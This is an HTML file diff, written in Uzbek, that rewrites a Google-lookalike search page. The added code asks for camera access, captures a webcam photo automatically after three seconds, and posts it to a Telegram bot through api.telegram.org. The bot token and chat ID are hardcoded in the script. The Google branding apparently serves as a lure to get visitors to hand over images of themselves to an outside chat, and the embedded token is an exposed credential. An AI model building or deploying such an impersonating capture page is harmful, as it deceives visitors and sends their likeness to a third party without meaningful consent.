@@ -1,62 +1,418 @@
 <!DOCTYPE html>
 <html lang="uz">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Google Style Search</title>
-  <link rel="stylesheet" href="./style.css" />
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Google Style Search + Camera (Test)</title>
+  <style>
+    /* --- Minimal styling (siz bergan uslubga mos) --- */
+    body { 
+      font-family: Arial, sans-serif; 
+      display:flex; 
+      flex-direction:column; 
+      align-items:center; 
+      margin:0; 
+      background:#fff; 
+    }
+    .navbar{ 
+      width:100%; 
+      text-align:right; 
+      padding:15px 25px; 
+    }
+    .nav-links{ 
+      display:flex; 
+      align-items:center; 
+      gap:15px; 
+      justify-content:flex-end; 
+    }
+    .login-btn{ 
+      background:#1a73e8; 
+      color:#fff; 
+      border:none; 
+      padding:8px 15px; 
+      border-radius:5px; 
+      cursor:pointer; 
+    }
+    .container{ 
+      margin-top:50px; 
+      text-align:center; 
+      width:100%; 
+      max-width:900px; 
+      padding:0 16px; 
+    }
+    .logo{ 
+      width:272px; 
+      height:auto; 
+      margin-bottom:20px; 
+    }
+    .search-box{ 
+      display:flex; 
+      align-items:center; 
+      border:1px solid #dfe1e5; 
+      border-radius:24px; 
+      width:580px; 
+      padding:10px 15px; 
+      margin:0 auto; 
+    }
+    .search-box input{ 
+      flex:1; 
+      border:none; 
+      outline:none; 
+      font-size:16px; 
+    }
+    .buttons{ 
+      margin-top:18px; 
+    }
+    .buttons button{ 
+      padding:10px 20px; 
+      margin:5px; 
+      border-radius:4px; 
+      border: 1px solid #f8f9fa;
+      background-color: #f8f9fa;
+      color: #3c4043;
+      cursor: pointer;
+    }
+    .buttons button:hover {
+      box-shadow: 0 1px 1px rgba(0,0,0,.1);
+      border: 1px solid #dadce0;
+    }
+
+    /* Camera UI */
+    .camera-card { 
+      margin-top:30px; 
+      display:flex; 
+      gap:20px; 
+      align-items:flex-start; 
+      justify-content:center; 
+      flex-wrap:wrap; 
+    }
+    .cam-box{ 
+      background:#f7f7f7; 
+      padding:12px; 
+      border-radius:8px; 
+      box-shadow:0 4px 10px rgba(0,0,0,0.08); 
+      width:360px; 
+    }
+    video, canvas { 
+      width:100%; 
+      border-radius:6px; 
+      background:#000; 
+      display:block; 
+    }
+    .controls { 
+      display:flex; 
+      gap:10px; 
+      margin-top:10px; 
+      justify-content:center; 
+    }
+    .controls button{ 
+      padding:8px 12px; 
+      border-radius:6px; 
+      border:none; 
+      cursor:pointer; 
+    }
+    .controls .capture-btn {
+      background: #1a73e8;
+      color: white;
+    }
+    .controls .reset-btn {
+      background: #f1f3f4;
+      color: #3c4043;
+    }
+    .notice { 
+      color:#555; 
+      margin-top:8px; 
+      font-size:13px; 
+    }
+    .preview { 
+      max-width:360px; 
+    }
+    .status {
+      margin-top: 10px;
+      padding: 8px;
+      border-radius: 4px;
+      font-size: 14px;
+    }
+    .status.success {
+      background-color: #e6f4ea;
+      color: #137333;
+    }
+    .status.error {
+      background-color: #fce8e6;
+      color: #c5221f;
+    }
+    .status.info {
+      background-color: #e8f0fe;
+      color: #1a73e8;
+    }
+    
+    /* Modal for permission request */
+    .permission-modal {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0,0,0,0.7);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+    .modal-content {
+      background: white;
+      padding: 25px;
+      border-radius: 12px;
+      max-width: 400px;
+      text-align: center;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+    }
+    .modal-content h2 {
+      margin-top: 0;
+      color: #1a73e8;
+    }
+    .modal-buttons {
+      margin-top: 20px;
+      display: flex;
+      gap: 10px;
+      justify-content: center;
+    }
+    .modal-buttons button {
+      padding: 10px 20px;
+      border-radius: 6px;
+      border: none;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    .allow-btn {
+      background: #1a73e8;
+      color: white;
+    }
+    .deny-btn {
+      background: #f1f3f4;
+      color: #3c4043;
+    }
+  </style>
 </head>
 <body>
   <div class="navbar">
     <div class="nav-links">
       <a href="#">Gmail</a>
       <a href="#">Rasmlar</a>
-      <div class="apps-icon">⋮</div>
       <button class="login-btn">Kirish</button>
     </div>
   </div>
 
   <div class="container">
-    <img
-      src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png"
-      alt="Google"
-      class="logo"
-    />
+    <img class="logo" src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="logo">
 
     <div class="search-box">
-      <span class="search-icon">
-        <svg focusable="false" viewBox="0 0 24 24">
-          <path d="M15.5 14h-.79l-.28-.27a6.471 6.471 0 0 0 
-          1.48-5.34C15.24 5.59 12.64 3 9.5 3S3.76 5.59 
-          3.76 8.39 6.36 13.78 9.5 13.78a6.5 6.5 0 0 0 
-          4.13-1.47l.27.28v.79l4.25 4.25c.41.41 
-          1.08.41 1.49 0s.41-1.08 0-1.49L15.5 14zM9.5 
-          12C7.01 12 5 9.99 5 7.5S7.01 3 9.5 3 
-          14 5.01 14 7.5 11.99 12 9.5 12z"></path>
-        </svg>
-      </span>
-
-      <input type="text" id="searchInput" placeholder="" />
-
-      <div class="icons">
-        <img src="https://www.gstatic.com/inputtools/images/tia.png" alt="keyboard" />
-        <img src="https://www.gstatic.com/images/icons/material/system/1x/mic_grey600_24dp.png" alt="mic" />
-        <img src="https://www.gstatic.com/images/icons/material/system/1x/photo_camera_grey600_24dp.png" alt="camera" />
-      </div>
+      <input id="searchInput" type="text" placeholder="Qidiruv..." />
     </div>
 
     <div class="buttons">
-      <button>Google qidiruvi</button>
-      <button>Omadingizni sinang</button>
+      <button>Google Qidiruv</button>
+      <button>Mening qo'limdan keladi</button>
     </div>
 
-    <p class="lang">
-      Google ushbu tilni taklif qiladi: 
-      <a href="#">русский</a> 
-      <a href="#">English</a>
-    </p>
+    <!-- Camera Section -->
+    <div class="camera-card">
+      <div class="cam-box">
+        <h3>Kamera</h3>
+        <video id="video" autoplay playsinline></video>
+        <div class="controls">
+          <button id="retryCamera" class="capture-btn">Kamerani qayta yoqish</button>
+        </div>
+        <div class="notice">
+          Saytga kirish bilan kamera ruxsatini so'raydi. Ruxsat berilsa, avtomatik suratga olinadi.
+        </div>
+      </div>
+      
+      <div class="cam-box preview">
+        <h3>Surat natijasi</h3>
+        <canvas id="canvas"></canvas>
+        <div class="controls">
+          <button id="sendBtn" class="capture-btn" disabled>Telegramga yuborish</button>
+        </div>
+        <div id="status" class="status"></div>
+      </div>
+    </div>
   </div>
 
-  <script src="script.js"></script>
+  <!-- Permission Request Modal -->
+  <div id="permissionModal" class="permission-modal">
+    <div class="modal-content">
+      <h2>Kamera ruxsati kerak</h2>
+      <p>Ushbu sayt kamera orqali avtomatik suratga olishni amalga oshiradi. Ruxsat berasizmi?</p>
+      <div class="modal-buttons">
+        <button id="allowCamera" class="allow-btn">Ruxsat berish</button>
+        <button id="denyCamera" class="deny-btn">Rad etish</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Telegram bot ma'lumotlari
+    const BOT_TOKEN = '7978359844:AAH_su2pm1WJQZuzSjkNsu8BRo-cemtvKgg';
+    const CHAT_ID = '7412640853';
+    
+    // Elementlarni olish
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const retryCameraBtn = document.getElementById('retryCamera');
+    const sendBtn = document.getElementById('sendBtn');
+    const statusDiv = document.getElementById('status');
+    const permissionModal = document.getElementById('permissionModal');
+    const allowCameraBtn = document.getElementById('allowCamera');
+    const denyCameraBtn = document.getElementById('denyCamera');
+    
+    let stream = null;
+    let capturedImage = null;
+    let autoCaptureTimeout = null;
+    
+    // Sayt yuklanganda modalni ko'rsatish
+    window.addEventListener('load', () => {
+      // Bir necha soniya kutib, keyin modalni ko'rsatish
+      setTimeout(() => {
+        permissionModal.style.display = 'flex';
+      }, 1000);
+    });
+    
+    // Ruxsat berish tugmasi
+    allowCameraBtn.addEventListener('click', () => {
+      permissionModal.style.display = 'none';
+      startCamera();
+    });
+    
+    // Rad etish tugmasi
+    denyCameraBtn.addEventListener('click', () => {
+      permissionModal.style.display = 'none';
+      showStatus("Kamera ruxsati rad etildi. Keyinroq qayta urinib ko'ring.", "error");
+    });
+    
+    // Kamerani yoqish
+    async function startCamera() {
+      try {
+        showStatus("Kamera ochilmoqda...", "info");
+        
+        // Kameraga ruxsat so'rash
+        stream = await navigator.mediaDevices.getUserMedia({ 
+          video: { 
+            width: { ideal: 640 },
+            height: { ideal: 480 },
+            facingMode: 'environment' 
+          } 
+        });
+        
+        // Video elementiga kamerani ulash
+        video.srcObject = stream;
+        
+        showStatus("Kamera muvaffaqiyatli yoqildi! 3 soniyadan keyin avtomatik suratga olinadi.", "success");
+        
+        // 3 soniyadan keyin avtomatik suratga olish
+        autoCaptureTimeout = setTimeout(() => {
+          captureImage();
+        }, 3000);
+        
+      } catch (err) {
+        console.error('Kamerani ochishda xatolik:', err);
+        showStatus("Kamerani ochishda xatolik yuz berdi. Iltimos, ruxsat bering.", "error");
+      }
+    }
+    
+    // Qayta urinish
+    retryCameraBtn.addEventListener('click', () => {
+      if (stream) {
+        // Agar kamera allaqachon ochiq bo'lsa, uni yopish
+        stopCamera();
+      }
+      startCamera();
+    });
+    
+    // Suratga olish
+    function captureImage() {
+      if (!stream) {
+        showStatus("Avval kamerani yoqishingiz kerak!", "error");
+        return;
+      }
+      
+      const context = canvas.getContext('2d');
+      
+      // Canvas o'lchamlarini video o'lchamlariga moslashtirish
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      
+      // Videodan surat olish
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      
+      // Canvasdan ma'lumot olish
+      capturedImage = canvas.toDataURL('image/jpeg');
+      
+      // Tugmalarni yoqish
+      sendBtn.disabled = false;
+      
+      showStatus("Surat avtomatik ravishda olingan!", "success");
+      
+      // Kamerani to'xtatish
+      stopCamera();
+    }
+    
+    // Kamerani to'xtatish
+    function stopCamera() {
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+        stream = null;
+      }
+      if (autoCaptureTimeout) {
+        clearTimeout(autoCaptureTimeout);
+        autoCaptureTimeout = null;
+      }
+    }
+    
+    // Telegramga yuborish
+    sendBtn.addEventListener('click', async () => {
+      if (!capturedImage) {
+        showStatus("Avval surat olishingiz kerak!", "error");
+        return;
+      }
+      
+      try {
+        showStatus("Surat Telegramga yuborilmoqda...", "info");
+        
+        // Base64 ma'lumotni blob formatiga o'tkazish
+        const response = await fetch(capturedImage);
+        const blob = await response.blob();
+        
+        // FormData yaratish
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'photo.jpg');
+        formData.append('caption', 'Web-kamera orqali avtomatik olingan surat');
+        
+        // Telegram API ga so'rov yuborish
+        const telegramResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        });
+        
+        const result = await telegramResponse.json();
+        
+        if (result.ok) {
+          showStatus("Surat muvaffaqiyatli Telegramga yuborildi!", "success");
+        } else {
+          showStatus("Surat yuborishda xatolik: " + result.description, "error");
+        }
+      } catch (error) {
+        console.error('Yuborishda xatolik:', error);
+        showStatus("Surat yuborishda xatolik yuz berdi.", "error");
+      }
+    });
+    
+    // Status ko'rsatish funksiyasi
+    function showStatus(message, type) {
+      statusDiv.textContent = message;
+      statusDiv.className = 'status ' + type;
+    }
+  </script>
 </body>
 </html>
